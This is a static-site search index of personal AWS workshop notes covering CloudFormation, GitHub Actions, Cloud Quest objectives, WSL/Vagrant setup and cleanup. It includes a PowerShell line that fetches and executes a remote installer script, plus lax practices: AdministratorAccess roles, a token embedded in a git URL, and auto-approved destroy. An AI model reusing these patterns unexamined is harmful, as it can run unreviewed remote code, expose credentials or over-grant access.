	"uri": "http://localhost:1313/aws-ws/7-fcj/7.4-cf/",
	"title": "CloudFormation",
	"tags": [],
	"description": "",
	"content": "AWS CloudFormation Source: https://000037.awsstudygroup.com/\nPrepairation IAM - Users: CloudFormation-user Permissions: AdministratorAccess Key: Name - Value: Admin User Download Access Key ID \u0026amp; Secret key IAM - Roles: CloudFormation-Role AWS Service EC2 Permission: AdministratorAccess Basic CloudFormation 2.1 Workspace\nCloud9: ASG-Cloud9-Workshop\nEC2 Instances Timeout 30 Minutes VPC: cloudformation-vpc Subnet: public-subnet-1 IAM Role: CloudFormation-Role Cloud9 Interface\nAWS settings - Credentials - Uncheck AWS managed temporary credentials Workspace:\nsudo yum -y install jq gettext bash-completion moreutils pip install cfn-lint cfn-lint \u0026ndash;version pip install taskcat "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.4-pipeline/",
	"title": "CodePipleline",
	"tags": [],
	"description": "",
	"content": "Updating \u0026hellip;.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.4-diy/",
	"title": "DIY",
	"tags": [],
	"description": "",
	"content": "DIY Activities Rename index.html to waves.html\nSolution Validation Method Validation Process:\nOur test servers will validate that you renamed index.html to waves.html. (A successful validation will find waves.html in your S3 bucket.)\nHints:\nUse the Actions dropdown menu to rename index.html to waves.html, and then type the website bucket name into the validation field. The bucket name begins with website-bucket- "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.4-git/",
	"title": "Git",
	"tags": [],
	"description": "",
	"content": "GitHub GitHub is a web-based platform built on top of Git, the distributed version control system. It offers a variety of features to help developers collaborate on software projects\nGitHub provides a platform for hosting Git repositories. Developers can create new repositories to store their code, either publicly (visible to everyone) or privately (accessible only to authorized collaborators)\nGitHub Actions is a continuous integration tool that allows developers to automate tasks for their web projects. In this course, learn how to use this powerful tool to build workflows triggered by events, develop a continuous integration and continuous delivery (CI/CD) pipeline, and create custom actions.\nCreate a repo : Create accesskey : Clone repo to local :\ngit clone https://\u0026lt;access token\u0026gt;U@github.com/nonotnonez/thegithub.git Create a README.md file : Copy Source and Push to git repo:\ngit add .\rgit commit -m \u0026#39;first check in\u0026#39;\rgit push First action Setup Github actions: https://github.com/nonotnonez/thegithub/actions/new\nChoose: Simple workflow -\u0026gt; Configure Change name blank.yml to hello.yml and Commit changes Click Actions to see the results Workflow and actions attributes\nname: The name of the workflow Not required on: The Github event that triggers the workflow Required On Events: Repository events push pull_request release Webhooks branch creation issues members Scheduled Cron format Jobs: Workflows must have at least one job Each job must have a identifier Must start with a letter or underscore Can only contain alphanumeric character,-,or_ runs-on: The type of machine needed to run the job Runners: Windows Server 2019 Ubuntu 18.04 macOS Catalina 10.15 Self-hosted runners steps List of actions or commands Access to the file system Each step runs in its own process uses Identifies an action to use Defines the location of that action run runs commands in the vitual environment\u0026rsquo;s shell name an optional identifier for the step "
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/4.1-ec2/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "Clean up resources We will process to clearn up all the resources\nTerraform: Run docker compose:\ndocker-compose run --rm terraform destroy --auto-approve AWS Checking "
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/",
	"title": "Resource Cleanup",
	"tags": [],
	"description": "",
	"content": "Clean up resources All processing to clearn up all the resources\nContent IAC CICD "
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/4.2-jenkins/",
	"title": "CICD",
	"tags": [],
	"description": "",
	"content": "We are processing \u0026hellip;.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/",
	"title": "Cloud Quest",
	"tags": [],
	"description": "",
	"content": "CLOUD Quest - Cloud Practitioner Cloud Practitioners will build basic cloud solutions using AWS services. You will learn about AWS Cloud concepts, security concepts, common use cases, billing and pricing models and business impacts.\nLearning Objectives For each assignment, you will receive an automated account to build a new solution on the AWS console. 1 - Cloud Computing Essentials : Create Amazon EC2 instances to run the computational modules for the island stabilization system. Each instance should be placed in a different Availability Zone in same Region. 2 - Cloud First: Migrate an existing website to static website hosting on Amazon S3 to improve reliability 3 - Computing Solutions: Increate the size of an Amazon EC2 instance to provide better application performance 4 - Cloud Economics: Configure a price estimate for an architecture that uses a variable amount of Amazon EC2 instances based on peak usage time. 5 - Networking: Review and change VPC network configurations to fix a connection issue 6 - VPCs: Allow communication between application hosted in different VPCs by using VPC perring. The Marketing and Developer EC2 instances need to access the Financial Services Server in the Finance department\u0026rsquo;s VPC. 7 - Database: Improve the operational efficiency of databases by using multiple Availability Zones and a read replica. 8 - Security: Use IAM to provide work permissions to engineers by using group settings and the least privilege principle. 9 - File Systems: Deploy and maintain a file systems infratructure that is accessible form three different servers. 10 - NoSQL: Craete a database to help our video streaming team track customer viewing behaviors from metadata, such as movies watched and device type 11 - Auto-healing and Scalling App: Create and configure an Amazon EC2 Auti Scaling group that follows scheduled scaling activities to add and remove EC2 instances. 12 - Highly Available: Increase website reliability by creating a highly available architecture that spans multiple Availability Zones with load balancing and health monitoring. "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.5-local/",
	"title": "Local",
	"tags": [],
	"description": "",
	"content": "VSCode \u0026amp; WSL Windows Subsystem for Linux (WSL) is a compatibility layer developed by Microsoft for running Linux binary executables natively on Windows 10 and Windows Server 2019. It enables developers to run a Linux distribution alongside their existing Windows system without the need for dual-booting or virtual machines.\nConfiguration\nWindows Features\rWindows Subsystem for Linux Vitual machine platform Install\rwsl \u0026ndash;update wsl \u0026ndash;list \u0026ndash;verbose wsl.exe \u0026ndash;install ubuntu wsl.exe \u0026ndash;set-version Ubuntu 2 wsl \u0026ndash;set-default ubuntu VSCode\rCtrl Shift P Add New WSL Window Vagrant \u0026amp; VirtualBox We will use local environment with Vagrant and VirtualBox to test best practices.\nVagrant : is an open-source tool for building and managing virtualized development environments. It helps developers create and configure reproducible and portable development environments that closely mimic production setups.\nVirtualbox :is a powerful open-source virtualization software developed by Oracle Corporation. It allows users to run multiple guest operating systems (OS) simultaneously on a single physical machine.\nConfiguration\n- Machine 1: **Linux-server** - IP: 192.168.33.100 - Memory: 2048 Mb - Machine 2: **Jenkins-server** - IP: 192.168.33.110 - Memory: 4096 Mb - Machine 3: **Monitor-server** - IP: 192.168.33.120 - Memory: 2048 Mb Vagrantfile Expand:\r# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;ubuntu/focal64\u0026#34; # Configuration for the first virtual machine config.vm.define \u0026#34;machine1\u0026#34; do |machine1| machine1.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.100\u0026#34; machine1.vm.hostname = \u0026#34;linux-server\u0026#34; machine1.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;2048\u0026#34; end machine1.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; end # Configuration for the second virtual machine config.vm.define \u0026#34;machine2\u0026#34; do |machine2| machine2.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.110\u0026#34; machine2.vm.hostname = \u0026#34;jenkins-server\u0026#34; machine2.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;4096\u0026#34; end machine2.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; end # Configuration for the third virtual machine config.vm.define \u0026#34;machine3\u0026#34; do |machine3| machine3.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.120\u0026#34; machine3.vm.hostname = \u0026#34;monitor-server\u0026#34; machine3.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;2048\u0026#34; end machine3.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; machine3.vm.provision \u0026#34;shell\u0026#34;, inline: \u0026lt;\u0026lt;-SHELL apt-get update SHELL end end Run\nvagrant up vagrant status vagrant ssh vagrant halt\rvagrant reload\rfor upgrade Ram, CPU\nvagrant destroy -f\rDestroy all machine\nWindows WSL \u0026amp; Vagrant Requirements\rWindows 10 Virtualbox WSL 2 Vagrant Vagrant plugin: vitualbox_WSL2 Install VirtualBox Install WSL2: wsl -l -v Install Powershell Preview Invoke-Expression \u0026#34;\u0026amp; { $(Invoke-Restmethod https://aka.ms/install-powershell.ps1) } -UseMSI -Preview\u0026#34; Install Vagrant (PS) # run inside WSL 2 # check https://www.vagrantup.com/downloads for more info curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add - sudo apt-add-repository \u0026#34;deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install vagrant Update Vagrant (PS): vagrant --version choco install vagrant --version 2.4.1 Enable WSL 2 support (The Terminal on WSL2) # append those two lines into ~/.bashrc echo \u0026#39;export VAGRANT_WSL_ENABLE_WINDOWS_ACCESS=\u0026#34;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;export PATH=\u0026#34;$PATH:/mnt/c/Program Files/Oracle/VirtualBox\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc # now reload the ~/.bashrc file source ~/.bashrc Install virtualbox_WSL2 plugin (The Terminal on WSL2) # Install virtualbox_WSL2 plugin vagrant plugin install virtualbox_WSL2 Install and configured (The Terminal on WSL2) Configuring\r# Go to Windows user\u0026#39;s dir from WSL cd /mnt/c/Users/\u0026lt;my-user-name\u0026gt;/ # Create a project dir mkdir -p projects/vagrant-demo cd projects/vagrant-demo # Create a Vagrantfile using Vagrant CLI vagrant init hashicorp/bionic64 ls -l Vagrantfile # Start a VM using Vagrantfile vagrant up # Login to the VM # (password is \u0026#39;vagrant\u0026#39;) vagrant ssh # Done :) Processing\rVagrantfile Vagrantfile (WSL): # -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| # Machine 1 configuration config.vm.define \u0026#34;machine1\u0026#34; do |machine1| machine1.vm.box = \u0026#34;hashicorp/bionic64\u0026#34; machine1.vm.hostname = \u0026#34;machine1\u0026#34; machine1.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.101\u0026#34; machine1.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = 1024 vb.cpus = 1 end end # Machine 2 configuration config.vm.define \u0026#34;machine2\u0026#34; do |machine2| machine2.vm.box = \u0026#34;hashicorp/bionic64\u0026#34; machine2.vm.hostname = \u0026#34;machine2\u0026#34; machine2.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.102\u0026#34; machine2.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = 1024 vb.cpus = 1 end end end vagrant ssh machine1 password: vagrant "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.5-networking/",
	"title": "Networking Concepts",
	"tags": [],
	"description": "",
	"content": "Business Request Help the bank setup a secure networking environment which allows communication between resources and the internet.\nLearning Objectives Define key features of VPCs, subnets, internet gateways and route tables. Describe the benefits of using Amazon VPCs. State the basics of CIDR block notation and IP addressing. Explain how VPC traffic is routed and secured using gateways, network access control lists, and security groups. "
},
{
	"uri": "http://localhost:1313/aws-ws/6-wsaudio/",
	"title": "AWS Workshop Studio",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOps Cloud DevSecOps extends the principles of DevSecOps to cloud environments. It focuses on securing applications and infrastructure deployed in the cloud by integrating security practices into cloud-native development and operations processes. Automation, continuous security, compliance, and collaboration are key components, ensuring that cloud-based applications are developed, deployed, and maintained securely and compliantly.\nLinks: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/2-setup\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.6-vpc/",
	"title": "Connecting VPCs",
	"tags": [],
	"description": "",
	"content": "VPCs Amazon VPC Overview Amazon VPC Concepts Amazon VPC Security Amazon VPC - Internet Connectivity Amazon VPC Peering Connections "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.7-database/",
	"title": "Databases in Practice",
	"tags": [],
	"description": "",
	"content": "Business Request Improve the insurance company\u0026rsquo;s relational database operations, performance, and availability.\nLearning Objectives Review the features, benefits and database types available with Amazon RDS. Describe vertical and horizontal scaling on Amazon RDS. Use Amazon RDS read replicas to increase database performance. Implement multi-AZ deployments of Amazon RDS to increase availability. "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/",
	"title": "First Cloud Journey",
	"tags": [],
	"description": "",
	"content": "First Cloud Journey Links: https://cloudjourney.awsstudygroup.com/\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.8-security/",
	"title": "Core Security Concepts",
	"tags": [],
	"description": "",
	"content": "AWS Identity and Access Managêmnt (IAM) AWS Security and Complicance Overview AWS Share Responsibility Model Overview AWS IAM - Overview AWS IAM - Manage Permissions AWS IAM - Manage IAM Roles AWS IAM Features - Access Analysis "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/",
	"title": "DevOps On AWS",
	"tags": [],
	"description": "",
	"content": " CI/CD stands for continuous integration, and then continuous delivery or deployment. It is a method used to frequently and reliably deliver software applications "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.9-efs/",
	"title": "File Systems in the Cloud",
	"tags": [],
	"description": "",
	"content": "Business Request Help the city\u0026rsquo;s pet modeling agency share file data without provisioning or managing storage.\nLearning Objectives Summarize the different storage options available on AWS. Summarize the key features and benefits of Amazon EFS. Identify business use cases for Amazon EFS. Configure Amazon EFS endpoints to access centralized storage. "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.10-nosql/",
	"title": "First NoSQL Database",
	"tags": [],
	"description": "",
	"content": "Business Request Help the island\u0026rsquo;s streaming entertainment service implement a NoSQL database to develop new features.\nLearning Objectives Summarize the different uses of common purpose-built databases. Describe the features and benefits of Amazon DynamoDB. Interact with the elements and attributes of an Amazon DynamoDB database. Set Up a NoSQL database with Amazon DynamoDB. "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.11-healscal/",
	"title": "Auto-healing and Scaling Applications",
	"tags": [],
	"description": "",
	"content": "Business Request Assist the city\u0026rsquo;s gaming cafe with implementing auto healing servers while restricting patrons to a specific provisioning capacity.\nLearning Objectives Describe the auto healing and scaling capabilities offered by Auto Scaling groups. Create an Auto Scaling group with strict resource boundaries. Configure an Auto Scaling group to respond to a time-based event. "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.12-ha/",
	"title": "Highly Available Web Applications",
	"tags": [],
	"description": "",
	"content": "Business Request Help the travel agency create a highly available web application architecture.\nLearning Objectives Describe the principles for architecting highly available applications. Summarize the benefits of using an AWS Application Load Balancer (ALB). Use Auto Scaling groups with load balancing and health monitoring. "
},
{
	"uri": "http://localhost:1313/aws-ws/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/aws-ws/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]